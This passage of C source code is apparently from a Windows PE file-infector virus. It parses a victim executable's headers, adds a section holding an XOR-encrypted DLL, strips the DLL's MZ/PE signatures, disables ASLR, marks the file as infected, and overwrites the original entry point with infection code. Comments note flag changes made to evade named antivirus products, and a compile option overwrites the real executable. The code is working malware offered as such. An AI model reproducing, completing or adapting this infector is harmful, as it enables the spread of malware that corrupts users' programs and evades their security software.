	  pe->usermajor = 0;
	  pe->linkmajor = 0;
	  pe->userminor = 0;
	  goto save_ivr;
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	 goto cycle;  // again loop through exe sections to get epOFS
	} // of old reinfect

	//--- new reinfect: ver>=17

	if ( (/*@S!=*/REINFECT!=0/*@E*/) && (infver>=17) )
	{
	 DWORD exe_szinfcode = ReinfectSince17(fname,b,len,org_len,epOFS,SECTALIGN,FILEALIGN);
	 if (exe_szinfcode==0) goto errexit;
	}

	//- 

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef PEDUMP
	 DumpFile("dump.001",b,len); // dump001 restored file: debug
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// --- check import table

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"\nEXE Check Import Table... pe->importsize:0x%X",pe->importsize);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	kernok = FALSE;

	for (q = 0; q < pe->importsize; q += SZIDTE)
	{
		DWORD idllofs, w;
		char dllname[0xFF];
		IMPORT_DIRECTORY_TABLE_ENTRY *idte=&b[/*@S+*/eiofs+q/*@E*/];
		if (/*@S==*/idte->ImportLookUp == 0/*@E*/) break;

		idllofs = /*@S+*/(idte->NameRVA-eiRVA) + eiofs/*@E*/; // import dll physoffs

		
		my_strcpy(dllname, &b[idllofs]);

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		 adddebf(fname," %s",dllname);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		for (w = 0; dllname[w] != 0; w++)
		 if (/*@S&&*/(dllname[w]>'a')&&(dllname[w]<'z')/*@E*/) dllname[w]-=('a'-'A');

		if (/*@S&&*/(dllname[0]=='K')&&(dllname[1]=='E')&&(dllname[2]=='R')&&(dllname[5]=='L')&&(dllname[6]=='3')&&(dllname[7]=='2')/*@E*/) kernok=TRUE;

		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
		 adddebf(fname,"EXE ImportEntry:%X dll:%s kernok:%u",eiofs+q,dllname,kernok);
		//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
	}

	if (/*@S==*/kernok==0/*@E*/) goto errexit;           

	// --- Vista fix set bit 0 (strip reloc) 
	// --- Win7 ASLR fix (IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE): reset bix 0x40

	pe->flags |= 1;                               //@S
	if (pe->dllflags&&0x40 == 0x40) pe->dllflags ^= 0x40;

	// --- get num of sections in DLL object table

	/* char * */	 td        = /*@S+*/t+szinfcode/*@E*/; //@E // pointer to dll
	/* DWORD */		 peofs_d   = ((DWORD*)&td[0x3C])[0];        // DLL PE 
	/* PE_HEADER * */pe_d	   = /*@S+*/td+peofs_d/*@E*/;

	if (REINFECT) goto skipbounds;

	// --- move down bound imports

	if (/*@S&&*/(pe->boundimprva !=0)&&(pe->boundimpsize != 0)&&(pe->headersize > newheadersize)/*@E*/)
	{
		DWORD src, dst;
		
		// we have 6 original sections in dll
		// we dont add to exe: dll.reloc , dll.edata , dll.idatae , dll.bss
		//      we add to exe: orig.dll  , dll.text  , dll.data

		src = /*@S+*/ peofs + SZPE + pe->numofobjects * SZOBJE /*@E*/; 
		dst = /*@S+*/ src + SZOBJE * SECTIONS /*@E*/;  

	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	  adddebf(fname,"\nEXE moving down bound imports... b[0x%X] ---> b[0x%X] block 0x%X bytes",src,dst,pe->boundimpsize);
	  adddebf(fname,"EXE new pe->boundimprva: 0x%X",pe->boundimprva+SZOBJE*SECTIONS);
	 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

		_memcpy(&b[dst], &b[src], pe->boundimpsize);
		pe->boundimprva += /*@S**/SZOBJE * SECTIONS/*@E*/;
	}

	// ---

	skipbounds:;

	len = align(len, FILEALIGN);

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"EXE aligned len:%X",len);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// --- Create section & add "ORIGINAL DLL" section to victim exe

	/* DWORD */ SECTSIZEA = align(dll_len+szinfcode,0x1000);   //@S

	obj_e=/*@S+*/b+peofs+SZPE+SZOBJE*pe->numofobjects/*@E*/;   //@E

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"EXE .data create section at obj_e->physoffs:0x%X obj_e->virtrva:0x%X",len,maxrva);
	 adddebf(fname,"EXE .data obj_e->physsize==obj_e->virtsize:0x%X",SECTSIZEA);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	//@S
	if (SECTNAME[0]==0) my_strcpy(obj_e->name,"PACK"); else my_strcpy(obj_e->name,SECTNAME);
	_memset(obj_e->reserved,0,12); 
	obj_e->virtsize    = SECTSIZEA;
	obj_e->virtrva     = maxrva;
	obj_e->physsize    = SECTSIZEA;
	obj_e->physoffs    = len;
	obj_e->objectflags = 0xE0000000;   // old:0xE0000020 (palit BullGuard, G Data, F-Secure Internet Security)
	                                   // Vista fix, old was: 0xC0000040
	//@E                               // bit 5 scn_cnt_code  
	                                   // bit29 mem_execute ;or fault on 1st instruction
	                                   // bit30 mem_read    ;or fault - cant read
	                                   // bit31 mem_write   ;or fault - cant write


	//@S
	len = align(/*@S+*/len+obj_e->physsize/*@E*/,FILEALIGN); 
	maxrva += SECTSIZEA;  
	maxrva = align(maxrva, SECTALIGN);
	pe->numofobjects++;
	pe->imagesize = align(/*@S+*/obj_e->virtrva + obj_e->virtsize/*@E*/, SECTALIGN);
	//@E
	
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"\nEXE maxrva:%X  len:0x%X  pe->imagesize:0x%X",maxrva,len,pe->imagesize);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// --- generate xorkey, save dll len

	key = /*@S+*/1+_rand()%253/*@E*/; //@S
	                
	td[1] = dll_len/0x1000;              //@E  // quantity of 4kb blocks in dll_len (max_size>1mb)
	td[0] = 'M'^key;                     //@S  // xor 'M' by key
	if (td[1]>10) td[1]-=_rand()%10;     //@E  // decrease quantity of 4k blocks by random value
	//@S
	td[2] = (dll_len-td[1]*0x1000)/512;    // the rest, in 512-bytes blocks

	//--- VIRULENCE

	if (VIRULENCE<51) td[0x40]=_rand()%50; else td[0x40]=VIRULENCE; // infector virulence

	//--- SAVE pe->entrypointrva - we need this func
	//    becouse in some NET exe (vista, infocard.exe)
	//    EP is changed by loader after start

	((DWORD*)&td[0x41])[0]=pe->entrypointrva;     

	//--- KILL dll dos stub & 'PE'==td[peofs_d]+td[peofs_d+1]

	for (i = 0x45; i < peofs_d + 2; i++) 
		td[i]=_rand()%255;
	//@E

	// copy infcode+dll to created section

	_memcpy(t,&b[epOFS],szinfcode); // copy original exe code before dll in t array
	_memcpy(&b[obj_e->physoffs],t,dll_len+szinfcode); // copy dll+infcode from t array

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"\nEXE> memcpy t(infcode+dll)_0  ---> created UPX0 EXE_%X size: %X",obj_e->physoffs,dll_len+szinfcode); 
	 adddebf(fname,"\nEXE> crypted_dll_offset: %X",obj_e->physoffs+szinfcode); 
	 adddebf(fname,"EXE> dll xor key:0x%.2X, dll_len:0x%X",key,dll_len);
	 adddebf(fname,"EXE> td==dll, td[0]:0x%.2X ('M'^key), td[1]:0x%.2X (4kb blocks of dll_len), td[2]:0x%.2X (the rest of dll_len in 512b-blocks)",(BYTE)td[0],td[1],td[2]);
	 adddebf(fname,"EXE> VIRULENCE td[0x40]:0x%.2X (dec:%u)",td[0x40],td[0x40]);
	 adddebf(fname,"EXE> ENTRYPOINT (0x%.8X) saved to td[0x41]",((DWORD*)&td[0x41])[0]);
	 adddebf(fname,"EXE> killed dos stub & MZ/PE signatures... 0x45-%X",peofs_d+2);
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	// encrypt dll

	dll_offs =/*@S+*/obj_e->physoffs + szinfcode/*@E*/; // dll offset in exe
	xors = dll_offs + 3; // start position of xor          // do not encrypt xorkey and len (3 bytes)

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"EXE> dll_encryption_xor_key:%.2X xor_area:%X-%X \x0D\x0A",key,xors,xors+dll_len); 
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	for (i=/*@S+*/xors/*@E*/;i</*@S+*/xors+dll_len/*@E*/;i++) b[i]=b[i]^key;

	// --- list & process dll object table sections

	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	 adddebf(fname,"*** LIST & PROCESS DLL OBJECT TABLE SECTIONS..."); 
	//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 for (q = 0; q < pe_d->numofobjects; q++)
 {
  obj_d = /*@S+*/td+peofs_d+SZPE+SZOBJE*q/*@E*/;                

  //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
   adddebf(fname,"===DLL SECT %c%c%c%c",obj_d->name[1],obj_d->name[2],obj_d->name[3],obj_d->name[4]); 
   adddebf(fname,"   DLL SECT phys_ofs:%X, phys_size:%X, virt_size:%X",obj_d->physoffs,obj_d->physsize,obj_d->virtsize);
   adddebf(fname,"   DLL SECT rva + dll_imgbase: %X",pe_d->imagebase + obj_d->virtrva);
  //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

  //.edata ; (if section will change, can use ExportTableRva)

  if (/*@S==*/obj_d->name[1]=='e'/*@E*/)
  {
   expOFS = obj_d->physoffs; //@S
   expRVA = obj_d->virtrva;  //@E

   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
    adddebf(fname,"   !!! GOT dll exports offset (expOFS:%X) & rva (expRVA:%X)",expOFS,expRVA); 
   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
   continue;
  }

  //.text
  if (/*@S==*/obj_d->name[1]=='t'/*@E*/)
  {
   dlltextRVA = obj_d->virtrva;  //@S //virt.rva
   dlltextVSZ = obj_d->virtsize;      //virt.size
   dlltextOFS = obj_d->physoffs;      //phys.offs
   dlltextPSZ = obj_d->physsize; //@E //phys.size

   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
    adddebf(fname,"   !!! GOT dll .text  dlltextOFS:%X, dlltextPSZ:%X, dlltextRVA:%X, dlltextVSZ:%X",dlltextOFS,dlltextPSZ,dlltextRVA,dlltextVSZ);
   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
   continue;
  }

  //.data
  if (/*@S==*/obj_d->name[1]=='d'/*@E*/)
  {
   dlldataRVA = obj_d->virtrva;  //@S //virt.rva
   dlldataVSZ = obj_d->virtsize;      //virt.size
   dlldataOFS = obj_d->physoffs;      //phys.offs
   dlldataPSZ = obj_d->physsize; //@E //phys.size

   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
    adddebf(fname,"   !!! GOT dll .data  dlldataOFS:%X, dlldataPSZ:%X, dlldataRVA:%X, dlldataVSZ:%X",dlldataOFS,dlldataPSZ,dlldataRVA,dlldataVSZ);
   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
   continue;
  }

  if (/*@S==*/obj_d->name[1]=='r'/*@E*/)
  {
   rel = obj_d->physoffs;

   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
    adddebf(fname,"   !!! GOT dll .reloc phys_offs... rel:%X",rel); 
   //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
   continue;
  }


 } //for (DWORD q=0;q<pe_d->numofobjects;q++)


 // STACK & HEAP reserve

 if (!REINFECT)
 {
  pe->stackreserve+=pe_d->stackreserve; //@S
  pe->heapreserve+=pe_d->heapreserve;   //@E
 }

 // mark as infected

 pe->usermajor = PEINF_USR_MA;                       //@S
 pe->linkmajor = PEINF_LNK_MA;
 pe->userminor = PEINF_VER;    

 // get LibMain from dll export table

 /* EXPORT_DIRECTORY_TABLE * */ edt = /*@S+*/ td + expOFS /*@E*/; //@E
 /* DWORD */				  feofs = /*@S+*/ expOFS + edt->AddressTableRVA /*@E*/ - expRVA; //first export offset

 /* dMEMORY * */ dmem  = /*@S+*/ td + feofs /*@E*/;
 /* DWORD */  dlbmRVA  = dmem->dword0;          // dll libmain RVA

//----- get exe LibMain RVA

 /* DWORD */ dlbmTextOFS = dlbmRVA - dlltextRVA; // dll libmain inside '.text' section offset

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"\n*** DLL ExportTable offset expOFS:%X, expRVA:%X, 1st Exp. Ofs feofs:%X",expOFS,expRVA,feofs);
  adddebf(fname,"*** DLL LibMain RVA dlbmRVA:%X, inside '.text' section offset dlbmTextOFS:%X ",dlbmRVA,dlbmTextOFS);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 //----- prepare data table for C_CODE

 dll_vadr          = /*@S+*/obj_e->virtrva + pe->imagebase + szinfcode/*@E*/;
 reloc_vadr        = dll_vadr + rel;         //@S
 new_dll_text_vadr = pe->imagebase + maxrva; 

 //DWORD repl_data[20];                              //@E
 //@S
 repl_data[0]  = dll_vadr;
 
 repl_data[1]  = dll_vadr + dlltextOFS;        // dll_text_vadr
 repl_data[2]  = dlltextPSZ;                   // dll_text_psize
 repl_data[3]  = new_dll_text_vadr;

 repl_data[4]  = dll_vadr + dlldataOFS;                       // dll_data_vadr
 repl_data[5]  = dlldataPSZ;                                  // dll_data_psize
 repl_data[6]  = new_dll_text_vadr + dlldataRVA - dlltextRVA; // new_dll_data_vadr

 repl_data[7]  = reloc_vadr;                            
 repl_data[8]  = pe->imagebase;                   // exe_imagebase
 repl_data[9]  = pe_d->imagebase;                 // dll_imagebase
 repl_data[10] = reloc_vadr + pe_d->fixupsize;    // reloc_vadr + dll_fixupsize

 repl_data[11] = dlltextRVA;
 repl_data[12] = dlldataRVA;
 repl_data[13] = dll_len;
 repl_data[14] = /*@S+*/0x1000000*(_rand()%255) + 0x10000*(_rand()%255) + 0x100*(_rand()%255) + key/*@E*/;

 exe_LibMain_vadr = new_dll_text_vadr + dlbmTextOFS; // LibMain vadr in victim exe
 //@E

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"*** exe_LibMain_vadr: %.8X  (LibMain vadr in victim exe)",exe_LibMain_vadr);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

  // added 0x1000 is fixup buffer for .idata (we do not check sect. borders more in C_CODE)

 add = /*@S+*/dlldataRVA - dlltextRVA + align(dlldataVSZ,0x1000) + 0x1000/*@E*/;

 maxrva+=add;          //@S
 pe->imagesize+=add;
 obj_e->virtsize+=add; //@E

 maxrva=align(maxrva,SECTALIGN);                //@S
 pe->imagesize=align(pe->imagesize,SECTALIGN);  //@E

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"\n  add: 0x%X (.bss vsize + dll .data vsize + .idata fixup buffer)",add);
  adddebf(fname,"added: exe 'UPX0' vsize:0x%X maxrva:0x%X pe->imagesize:0x%X",obj_e->virtsize,maxrva,pe->imagesize);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"\n===== prepare C_CODE 'repl_data' replace table");

  adddebf(fname,"# FE repl_data[0]: %.8X  (dll_vadr in victim exe)",repl_data[0]);
  adddebf(fname,"# FD repl_data[1]: %.8X  (dll_text_vadr) ",repl_data[1]);
  adddebf(fname,"# FC repl_data[2]: %.8X  (dll_text_psize)",repl_data[2]);
  adddebf(fname,"# FB repl_data[3]: %.8X  (new_dll_text_vadr in victim exe)\n",repl_data[3]);
  adddebf(fname,"# FA repl_data[4]: %.8X  (dll_data_vadr) ",repl_data[4]);
  adddebf(fname,"# F9 repl_data[5]: %.8X  (dll_data_psize)",repl_data[5]);
  adddebf(fname,"# F8 repl_data[6]: %.8X  (new_dll_data_vadr in victim exe)\n",repl_data[6]);
  adddebf(fname,"# F7 repl_data[7]: %.8X  (reloc_vadr in victim exe)",repl_data[7]);
  adddebf(fname,"# F6 repl_data[8]: %.8X  (exe_imagebase)",repl_data[8]);
  adddebf(fname,"# F5 repl_data[9]: %.8X  (dll_imagebase)",repl_data[9]);
  adddebf(fname,"# F4 repl_data[10]: %.8X  (reloc_vadr + dll_fixupsize)\n",repl_data[10]);
  adddebf(fname,"# F3 repl_data[11]: %.8X  (dlltextRVA)",repl_data[11]);
  adddebf(fname,"# F2 repl_data[12]: %.8X  (dlldataRVA)\n",repl_data[12]);
  adddebf(fname,"# F1 repl_data[13]: %.8X  (dll_len)\n",repl_data[13]);
  adddebf(fname,"# F0 repl_data[14]: %.8X  (xorkey: zzyyccXX , only XX is key)\n",repl_data[14]);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if


 //----- copy C_CODE to entry point

 WriteOrGetLen_C_CODE(&b[epOFS],&repl_data,exe_LibMain_vadr,epRVA);

 //----- set 'jmp EP' at the end of LibMain

 start = dll_offs + dlltextOFS;

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"* dll_offs:0x%X   dlltextOFS:0x%X",dll_offs,dlltextOFS);
  adddebf(fname,"* SEARCH start:0x%X end:0x%X",start,start+dlltextPSZ);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 jmp_ofs=0;

//  ".byte 0xC9                      \n"  00             //  leave
//  ".byte 0x61                      \n"  01             //  popad
//  ".byte 0xE9,0x00,0x00,0x00,0x00  \n"  02 03 04 05 06 //  jmp orig_EP    
//  ".byte 0xC3                      \n"  07             //  retn  ; NOT USED, JUST SIGNATURE FOR SEARCH

	for (q = start; q < start + dlltextPSZ; q++)
	{
		BYTE c0, c1, c2, c7;
		c0=b[q]^key;   //@S //xorkey
		c1=b[q+1]^key; 
		c2=b[q+2]^key; 
		c7=b[q+7]^key; //@E
		
		if ((c0 == 0xC9) && (c1 == 0x61) && (c2 == 0xE9) && (c7 == 0xC3)) 
		{ jmp_ofs=q+2; break; }
	}

 if (jmp_ofs == 0) goto errexit; // not found, something is corrupted

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"* FOUND jmp sig (C9 61 E9 XX XX XX XX C3) at b[0x%X],   jmp_ofs:0x%X\n",q-2,q);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 ip1=repl_data[3]+jmp_ofs-start; //@S  // eip of jmp xxxxxxxx: repl_data[3]==new_dll_text_vadr
 ip2=pe->imagebase+epRVA;        //@E  // entry point vadr

  // abcd=ffffffff-ip1+ip2-4
  // we use fffffffe and -3 instead: with 0xFFFFFFFF lcc makes stack bug

 abcd=/*@S+*/(0xFFFFFFFE-ip1)+ip2/*@E*/-3;    
                                                    
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname," SET jmp_exeEP at ip1:%.8X to ip2:%.8X, abcd=%.8X\n",ip1,ip2,abcd);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 ((DWORD*)(&b[jmp_ofs+1]))[0]=abcd;
 
 b[jmp_ofs+1]^=key; //@S
 b[jmp_ofs+2]^=key;
 b[jmp_ofs+3]^=key;
 b[jmp_ofs+4]^=key; //@E

 //----- save to '.vir' file

 save_ivr:;

 _CloseHandle(h);   //@S

 my_strcpy(nfname,fname);    //@S
 slen = strlen(fname);   //@E

 nfname[slen-3] = 'v'; //@S
 nfname[slen-2] = 'i';
 nfname[slen-1] = 'r'; //@E

 h=_CreateFile(nfname,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
 _WriteFile(h,b,len,&q,NULL);

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
  adddebf(fname,"================= CreateFile h:%i",h);
  adddebf(fname,"  exe file align: 0x%X",FILEALIGN);
  adddebf(fname," infect_by fsize: 0x%X",dll_len);
  adddebf(fname," aligned_infbysz: 0x%X",align(dll_len,FILEALIGN));
  adddebf(fname,"    infcode size: 0x%X",szinfcode);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 _CloseHandle(h); //@S
 _LocalFree(b);   //@E

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef AV_CURE
	if (h != INVALID_HANDLE_VALUE) { adddebf(fname," CURED! len:%u file:%s",len,nfname); }
							  else { adddebf(fname," CURE ERR! file:%s",nfname); }
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 //----- rename '.ivr' to '.exe' if real infect

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef REAL_INFECT	
	_CopyFile(nfname,fname,FALSE);
	_DeleteFile(nfname);
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	return TRUE;

 errexit:;

 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef pedbg
	adddebf(fname,"\t...NOT INFECTED");
 //REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

 realexit:;
	_CloseHandle(h);              //@S
	if (b != NULL) _LocalFree(b);   //@E
	return FALSE;
}
